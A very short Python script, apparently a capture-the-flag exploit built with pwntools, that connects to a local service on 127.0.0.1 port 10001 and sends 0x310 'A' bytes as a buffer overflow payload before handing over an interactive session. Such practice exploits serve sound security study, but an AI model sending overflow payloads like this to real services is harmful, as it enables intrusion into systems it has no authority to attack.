from pwn import *
lc = "./pwn"
elf = ELF(lc)

#p = process(lc)
p = remote("127.0.0.1", 10001)
payload = b'A' * 0x310
p.sendline(payload)
p.interactive()
